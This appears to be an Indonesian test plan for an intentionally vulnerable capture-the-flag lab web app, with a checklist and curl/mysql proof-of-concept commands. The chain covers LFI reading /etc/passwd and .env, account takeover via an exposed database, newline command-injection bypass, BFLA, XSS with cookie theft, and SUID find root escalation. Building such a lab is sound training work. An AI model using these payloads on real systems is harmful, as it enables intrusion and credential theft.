# Rencana & Status Pengujian

## Checklist Verifikasi Lokal

- [ ] `docker compose up --build` - `web` dan `db` start bersih tanpa error.
- [ ] Login pakai akun demo karyawan (`budi.santoso` / `Karyawan123!`) berhasil,
      dashboard menampilkan klaim seed data milik sendiri saja.
- [ ] Ajukan klaim baru (dengan & tanpa lampiran jpg/png/pdf) berhasil, redirect
      ke `/index.php?msg=...` dengan flash message tampil.
- [ ] **LFI (quick win)**: `debug_viewer.php?path=/etc/passwd` mengembalikan isi
      file tanpa perlu traversal, tanpa perlu login.
- [ ] **LFI - baca `.env`**: `debug_viewer.php?path=/var/www/.env` mengembalikan
      `DB_HOST`/`DB_NAME`/`DB_USER`/`DB_PASS`. Konfirmasi `GET /.env` langsung
      (tanpa LFI) mengembalikan 404 - membuktikan file memang di luar docroot.
- [ ] **DB port terekspos**: `docker compose ps` menampilkan port mapping
      `3306:3306` untuk service `db`; `mysql -h 127.0.0.1 -P 3306 -u klaimku_app -pklaimku_app_pw klaimku`
      berhasil connect dari host (bukan dari dalam container).
- [ ] **Account takeover**: `SELECT id, username, role FROM users;` menampilkan
      akun `dewi.lestari` (role `hr`) yang kredensialnya tidak ada di README;
      `UPDATE users SET password_hash = '<bcrypt hash buatan sendiri>' WHERE username = 'dewi.lestari';`
      berhasil; login ke aplikasi sebagai `dewi.lestari` pakai plaintext yang
      baru saja ditentukan sendiri berhasil (redirect ke `/index.php`, role `hr`
      di session, `GET /admin/index.php` berhasil bukan HTTP 403).
- [ ] **Command Injection - payload naif diblokir**: sebagai HR, POST
      `rekening_bank=127.0.0.1; id` ke `admin/verify_rekening.php` harus
      menampilkan pesan "karakter yang tidak diizinkan" (bukan output `id`).
      Ulangi dengan `|` dan `&` - harus diblokir juga.
- [ ] **Command Injection - bypass newline**: POST `rekening_bank` berisi
      newline literal (`127.0.0.1\nid`, atau `--data-urlencode` dengan value
      multi-baris) - output menampilkan hasil `id` (`uid=33(www-data)`).
      Lanjutkan ke reverse shell interaktif (diperlukan untuk langkah privesc).
- [ ] **Command Injection - bypass command substitution**: POST
      `rekening_bank=$(id)` atau `` rekening_bank=`id` `` - output memuat hasil
      `id` tergabung dalam teks "Nomor rekening ... tidak valid" (beda gaya
      tampil dari bypass newline, tapi sama-sama bukti eksekusi command).
- [ ] **Uji negatif akses**: akses `admin/verify_rekening.php` sebagai karyawan
      biasa (bukan HR) harus HTTP 403.
- [ ] **BFLA**: login sebagai karyawan biasa, POST langsung ke `admin/approve.php`
      dengan `id` klaim miliknya sendiri (`action=approve`) - status berubah tanpa
      pernah login sebagai HR. Konfirmasi `GET /admin/index.php` sebagai karyawan
      biasa dikembalikan HTTP 403.
- [ ] **DOM XSS**: buka `index.php?msg=<img src=x onerror=alert(1)>` di browser
      sungguhan (bukan curl) - konfirmasi `alert` muncul. Uji lanjut dengan payload
      `fetch()` ke listener lokal untuk membuktikan pencurian `document.cookie`.
- [ ] **Privesc**: dari shell `www-data`, `find / -perm -4000 -type f 2>/dev/null`
      menampilkan `/usr/bin/find` (tidak standar di antara SUID binary Debian
      lainnya); `find . -exec /bin/sh -p \; -quit` menghasilkan shell baru dengan
      `euid=0(root)`.
- [ ] **Flag**: `cat /root/flag.txt` sebagai `www-data` biasa (sebelum privesc)
      harus gagal (`Permission denied`, mode `600`); setelah privesc berhasil,
      `cat /root/flag.txt` menampilkan `KLAIMKU{suid_find_root_pwn}`.
- [ ] Konfirmasi `docker-compose.yml` service `web` tidak mem-mount
      `/var/run/docker.sock` dan tidak `privileged` (batas root-in-container).
- [ ] Reload halaman berkali-kali tidak memicu error PHP (cek
      `docker compose logs web` untuk warning/error yang tidak disengaja).

## Cara Iterasi Cepat

```bash
docker compose up --build
# aplikasi tersedia di http://localhost:8084
# MySQL tersedia langsung di localhost:3306 (sengaja diekspos - lihat ARCHITECTURE.md)

# lihat log Apache/PHP
docker compose logs -f web

# masuk ke container web untuk debugging manual
docker compose exec web bash

# cek bit SUID pada find dari dalam container
docker compose exec web ls -la /usr/bin/find

# reset database (hapus volume) kalau seed perlu diulang dari nol
docker compose down -v
```

Catatan: kalau port `3306` di mesin lokal sudah dipakai MySQL/MariaDB lain,
ubah pemetaan port di `docker-compose.yml` (mis. `"33061:3306"`) dan sesuaikan
perintah `mysql -P` di bawah.

## Contoh Perintah PoC - Alur Lengkap LFI -> Account Takeover -> RCE

```bash
# 1. LFI: baca .env untuk dapat kredensial DB
curl -s "http://localhost:8084/debug_viewer.php?path=/var/www/.env"

# 2. Connect langsung ke MySQL yang terekspos, pakai kredensial di atas
mysql -h 127.0.0.1 -P 3306 -u klaimku_app -pklaimku_app_pw klaimku \
      -e "SELECT id, username, role FROM users;"

# 3. Buat bcrypt hash untuk plaintext yang kita tentukan sendiri
php -r "echo password_hash('P4ssw0rd!takeover', PASSWORD_BCRYPT), PHP_EOL;"

# 4. Timpa password_hash akun HR (ganti <HASH> dengan hasil langkah 3)
mysql -h 127.0.0.1 -P 3306 -u klaimku_app -pklaimku_app_pw klaimku \
      -e "UPDATE users SET password_hash = '<HASH>' WHERE username = 'dewi.lestari';"

# 5. Login sebagai HR pakai plaintext yang baru ditentukan sendiri
curl -s -c cookies_hr.txt -d "username=dewi.lestari&password=P4ssw0rd!takeover" \
     http://localhost:8084/login.php -i

# 6. Payload naif diblokir filter (harus gagal)
curl -s -b cookies_hr.txt --data-urlencode "rekening_bank=127.0.0.1; id" \
     http://localhost:8084/admin/verify_rekening.php

# 7. Bypass filter pakai newline sebagai pemisah command -> RCE
curl -s -b cookies_hr.txt --data-urlencode "rekening_bank=127.0.0.1
id" http://localhost:8084/admin/verify_rekening.php

# 8. BFLA (independen, cukup akun karyawan): approve klaim sendiri tanpa lewat HR
curl -s -c cookies.txt -d "username=budi.santoso&password=Karyawan123!" \
     http://localhost:8084/login.php -i
curl -s -b cookies.txt -d "id=2&action=approve" \
     http://localhost:8084/admin/approve.php
```

## Belum Bisa Diverifikasi Sepenuhnya Tanpa Browser Sungguhan

- [ ] DOM-based XSS (temuan #5) butuh browser sungguhan untuk eksekusi JS - tidak
      bisa dibuktikan lewat `curl` saja, hanya lewat pemeriksaan source
      `assets/js/app.js` + pengujian manual di browser.
